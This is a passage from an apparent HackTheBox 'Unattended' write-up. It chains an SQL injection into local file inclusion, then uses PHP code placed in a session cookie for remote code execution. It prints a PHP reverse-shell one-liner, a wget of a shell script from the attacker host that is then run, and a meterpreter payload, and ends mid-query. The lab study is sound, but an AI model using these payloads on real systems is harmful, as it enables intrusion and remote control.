class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Table <code>idname</code> :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+<span class="comment">-----+-------------+----------+</span></span><br><span class="line">| id  | name        | disabled |</span><br><span class="line">+<span class="comment">-----+-------------+----------+</span></span><br><span class="line">| 1   | main.php    | 1        |</span><br><span class="line">| 2   | about.php   | 1        |</span><br><span class="line">| 3   | contact.php | 1        |</span><br><span class="line">| 25  | main        | 0        |</span><br><span class="line">| 465 | about       | 0        |</span><br><span class="line">| 587 | contact     | 0        |</span><br><span class="line">+<span class="comment">-----+-------------+----------+</span></span><br></pre></td></tr></table></figure>
<p>There is another function called <code>getPathFromTpl</code> which takes the returned page name and queries the actual path from the table <code>filepath</code> then returns it :<br>Function <code>getPathFromTpl()</code> : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPathFromTpl</span><span class="params">($conn,$tpl)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $debug;</span><br><span class="line">	$sql = <span class="string">"SELECT path from filepath where name = '"</span>.$tpl.<span class="string">"'"</span>;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"sqlpath: $sql\n"</span>; &#125;</span><br><span class="line">	$result = $conn-&gt;query($sql);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">			$ret = $row[<span class="string">'path'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"retpath: $ret\n"</span>; &#125;</span><br><span class="line">	<span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Table <code>filepath</code> :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+<span class="comment">---------+--------------------------------------+</span></span><br><span class="line">| name    | path                                 |</span><br><span class="line">+<span class="comment">---------+--------------------------------------+</span></span><br><span class="line">| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |</span><br><span class="line">| contact | 0f710bba8d16303a415266af8bb52fcb.php |</span><br><span class="line">| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |</span><br><span class="line">+<span class="comment">---------+--------------------------------------+</span></span><br></pre></td></tr></table></figure>
<p>The first function gets called and its return value gets saved in the variable <code>tpl</code> : <code>$tpl = getTplFromID($conn);</code><br>Then the second function gets called with the variable <code>tpl</code> and its return value gets saved in the variable <code>inc</code><br>And finally it includes that page <code>include(&quot;$inc&quot;);</code><br>We have a <code>SQL</code> injection vulnerability which we can use to control what’s being included, in other words we have a local file inclusion vulnerability.<br>After some attempts to read <code>/etc/passwd</code> this payload worked : <code>&#39; UNION SELECT &quot;main&#39; UNION SELECT &#39;/etc/passwd&#39;;-- &quot;;--</code><br><img src="/images/hackthebox/unattended/15.png" alt=""></p>
<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI to RCE"></a>LFI to RCE</h2><p>We need to get <code>RCE</code> from this <code>LFI</code>. If I could include my session file (<code>/var/lib/php/session/sess_[SESSION COOKIE]</code>) then I could put <code>php</code> code in a cookie and include it. My session cookie was <code>c5vmccsqkle2rdionj28kit221</code>.<br>Request :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.nestedflanders.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=c5vmccsqkle2rdionj28kit221;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.10.3</span><br><span class="line"><span class="attribute">Date</span>: Fri, 23 Aug 2019 16:25:24 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 935</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Upstream</span>: 127.0.0.1:8080</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">----------------</span><br><span class="line"> Removed Output</span><br><span class="line">----------------</span><br><span class="line">&lt;!-- &lt;div align="center"&gt; --&gt;</span><br><span class="line"><span class="attribute">PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";</span></span><br><span class="line">&lt;!-- &lt;/div&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt; &lt;!-- row --&gt;</span><br><span class="line">&lt;/div&gt; &lt;!-- container --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>It worked, I created a cookie and called it <code>RCE</code>, any <code>php</code> code I put there will be included and executed so we can get <code>RCE</code> by <code>system()</code> or <code>passthru()</code>, let’s try <code>whoami</code> :<br>Request :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.nestedflanders.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('whoami')?&gt;;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.10.3</span><br><span class="line"><span class="attribute">Date</span>: Fri, 23 Aug 2019 16:25:45 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 955</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Upstream</span>: 127.0.0.1:8080</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">----------------</span><br><span class="line"> Removed Output</span><br><span class="line">----------------</span><br><span class="line">&lt;!-- &lt;div align="center"&gt; --&gt;</span><br><span class="line"><span class="attribute">PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:26:"www-data</span></span><br><span class="line">";&lt;!-- &lt;/div&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt; &lt;!-- row --&gt;</span><br><span class="line">&lt;/div&gt; &lt;!-- container --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>I spent a lot of time trying to get a reverse shell and I couldn’t, so I checked <code>iptables</code> rules :<br>Request :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.nestedflanders.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cat /etc/iptables/rules.v4')?&gt;;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.10.3</span><br><span class="line"><span class="attribute">Date</span>: Fri, 23 Aug 2019 16:27:11 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 1592</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Upstream</span>: 127.0.0.1:8080</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">----------------</span><br><span class="line"> Removed Output</span><br><span class="line">----------------</span><br><span class="line">&lt;!-- &lt;div align="center"&gt; --&gt;</span><br><span class="line">PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:46:"# Generated by iptables-save v1.6.0 on Wed Dec 19 21:55:49 2018</span><br><span class="line">*filter</span><br><span class="line">:INPUT DROP [7:1813]</span><br><span class="line">:FORWARD ACCEPT [0:0]</span><br><span class="line">:OUTPUT DROP [34:2661]</span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line">-A INPUT -i ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A INPUT -i ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT</span><br><span class="line">-A INPUT -i ens33 -p icmp -j ACCEPT</span><br><span class="line">-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A FORWARD -j DROP</span><br><span class="line">-A OUTPUT -o lo -j ACCEPT</span><br><span class="line">-A OUTPUT -o ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A OUTPUT -o ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT</span><br><span class="line">-A OUTPUT -o ens33 -p icmp -j ACCEPT</span><br><span class="line"><span class="attribute">COMMIT</span></span><br><span class="line"># Completed on Wed Dec 19 21:55:49 2018</span><br><span class="line">";&lt;!-- &lt;/div&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt; &lt;!-- row --&gt;</span><br><span class="line">&lt;/div&gt; &lt;!-- container --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>We can only get a reverse shell on ports 443 and 80. My problem was trying to get a connection on port 1337.<br><code>nc</code> wasn’t on the box so I used <code>php</code> to get a reverse shell.<br><code>shell.sh</code> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("10.10.xx.xx",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<p>I started a python server on port 80 then I downloaded the shell file on the box and executed it :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.nestedflanders.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; wget http://10.10.xx.xx/shell.sh')?&gt;;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.nestedflanders.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; sh shell.sh')?&gt;;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure>
<p>And we get a shell as <code>www-data</code> :<br><img src="/images/hackthebox/unattended/16.png" alt=""><br>But I didn’t like 2 things about this shell. First thing, it wasn’t a tty shell. Second thing, with only 2 ports available It was annoying because I usually need more shells. So I created a <code>php</code> <code>meterpreter</code> payload because with <code>meterpreter</code> I can spawn as many shells as I want and they can be tty shells.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;unattended# msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.10.xx.xx LPORT&#x3D;80 &gt; shell.php                                                                                          </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1110 bytes</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;tmp</span><br><span class="line">$ wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;shell.php</span><br><span class="line">--2019-08-23 13:09:38--  http:&#x2F;&#x2F;10.10.xx.xx&#x2F;shell.php</span><br><span class="line">Connecting to 10.10.xx.xx:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1110 (1.1K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: &#39;shell.php&#39;</span><br><span class="line"></span><br><span class="line">     0K .                                                     100% 92.4M&#x3D;0s</span><br><span class="line"></span><br><span class="line">2019-08-23 13:09:39 (92.4 MB&#x2F;s) - &#39;shell.php&#39; saved [1110&#x2F;1110]</span><br><span class="line"></span><br><span class="line">$ php .&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use multi&#x2F;handler</span><br><span class="line">set msf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 10.10.xx.xx</span><br><span class="line">LHOST &#x3D;&gt; 10.10.xx.xx</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 80</span><br><span class="line">LPORT &#x3D;&gt; 80</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.xx.xx:80</span><br><span class="line">[*] Sending stage (38247 bytes) to 10.10.10.126</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.xx.xx:80 -&gt; 10.10.10.126:47866) at 2019-08-23 19:09:59 +0200</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/unattended/17.png" alt=""><br>Note : I stopped the python server before starting the listener because both of them use port 80.</p>
<h2 id="Shell-as-guly-User-Flag"><a href="#Shell-as-guly-User-Flag" class="headerlink" title="Shell as guly, User Flag"></a>Shell as guly, User Flag</h2><p>There is only one user on the box : <code>guly</code>, and we can’t access the home directory :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@unattended:&#x2F;tmp$ ls -la &#x2F;home     </span><br><span class="line">ls -la &#x2F;home</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root root 4096 Dec 20  2018 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Dec 21  2018 ..</span><br><span class="line">drwxr-x---  2 guly guly 4096 Apr  2 17:11 guly</span><br><span class="line">www-data@unattended:&#x2F;tmp$ cd &#x2F;home&#x2F;guly</span><br><span class="line">cd &#x2F;home&#x2F;guly</span><br><span class="line">bash: cd: &#x2F;home&#x2F;guly: Permission denied</span><br><span class="line">www-data@unattended:&#x2F;tmp$</span><br></pre></td></tr></table></figure>
<p>Earlier we got the database credentials from <code>index.php</code> and we couldn’t dump the whole database because of the slow process, let’s check the database :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@unattended:&#x2F;tmp$ mysql -h localhost -u nestedflanders -p</span><br><span class="line">mysql -h localhost -u nestedflanders -p</span><br><span class="line">Enter password: 1036913cf7d38d4ea4f79b050f171e9fbf3f5e</span><br><span class="line"></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 14511</span><br><span class="line">Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use neddy;</span><br><span class="line"><span class="keyword">use</span> neddy;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [neddy]&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| Tables_in_neddy |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| config          |</span><br><span class="line">| customers       |</span><br><span class="line">| employees       |</span><br><span class="line">| filepath        |</span><br><span class="line">| idname          |</span><br><span class="line">| offices         |</span><br><span class="line">| orderdetails    |</span><br><span class="line">| orders          |</span><br><span class="line">| payments        |</span><br><span class="line">| productlines    |</span><br><span class="line">| products        |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">11 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [neddy]&gt;</span><br></pre></td></tr></table></figure>
<p><code>config</code> looks interesting, let’s check it :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [neddy]&gt; select * from config;                                                                                                                                                                             